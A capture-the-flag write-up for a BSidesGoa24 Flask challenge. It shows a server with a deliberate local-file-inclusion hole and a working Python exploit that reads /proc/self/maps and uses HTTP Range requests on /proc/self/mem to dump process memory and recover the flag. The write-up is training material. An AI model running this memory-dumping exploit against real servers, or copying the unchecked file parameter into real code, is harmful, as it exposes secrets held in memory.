# Flask Server - Flag in memory

```python
from flask import Flask, request, Response
from werkzeug.http import parse_range_header
import os

app = Flask(__name__)

with open('./flag.txt','r') as f:
    flag = f.read()

os.remove('./flag.txt')

@app.route('/')
def root():
    resp = Response("")
    resp.headers["Location"] = "/file?file=impsbl.txt"
    return resp, 302

@app.route('/file')
def fil():
    if(request.args.get('file')):
        try:
            file_path = request.args.get('file')
            if not os.path.exists(file_path):
                return "File not found", 404

            range_header = request.headers.get('Range')
            if range_header:
                file_size = os.path.getsize(file_path)
                ranges = parse_range_header(range_header, file_size)
                if ranges is None:
                    return "Invalid range request", 416

                start, end = ranges.ranges[0]  

                with open(file_path, 'rb') as f:
                    f.seek(start)
                    data = f.read(end - start + 1)

            
                headers = {
                    'Content-Range': f"bytes {start}-{end}/{file_size}",
                    'Accept-Ranges': 'bytes',
                    'Content-Length': len(data),
                    'Content-Type': 'application/octet-stream'
                }

                return data, 206, headers 
            else:
                data = open(file_path, 'rb').read()
                return data

        except Exception as e:
            resp = Response(str(e))
            resp.headers["Accept-Ranges"] = "bytes"
            return resp
    else:
        resp = Response("Please provide a file parameter, /?file=")
        resp.headers["Accept-Ranges"] = "bytes"
        return  resp

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

@app.route('/flag')
def get_flag():
    return flag
```

Flag is kept in memory, but deleted from system. `/flag` route doesn't work as it comes after server deployment. LFI means we can read files but that's all.
To read the memory of process we need `/proc/self/mem`, but to read we need offsets (start and end). That's where `/proc/self/maps` comes in. `maps` gives us regions to read and we can make request using `Range` header to get bytes within that area.

Pwn the shit out of it! D:

```python
import requests
import re
import os

URL = 'http://0:5000/file'
URL = 'https://ch1831183020.ch.eng.run/file'

maps = requests.get(URL, params={'file': '/proc/self/maps'}).text.split('\n')

with open('proc.dump', 'wb') as f:
    for line in maps:
        try:
            print(line)
            match = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if match.group(3) == 'r':
                start = int(match.group(1), 16)
                end = int(match.group(2), 16)
                resp = requests.get(URL, params={'file': '/proc/self/mem'}, headers={'Range': f'bytes={start}-{end}'})
                f.write(resp.content)
                os.system('grep "BSidesGoa24{" proc.dump -inao')
        except KeyboardInterrupt:
            exit(1)
        except Exception as e:
            print(e)
```

```bash
└─$ grep 'BSidesGoa24' proc.dump -ina | strings | grep BSides
BSidesGoa24{n3v3r_l3t_g0}
BSidesGoa24{n3v3r_l3t_g0}
```

PS: I thought flag was `flag{`, but it was `BSidesGoa24` so `grep` might have worked faster then waiting for full dump. Dump was 62mb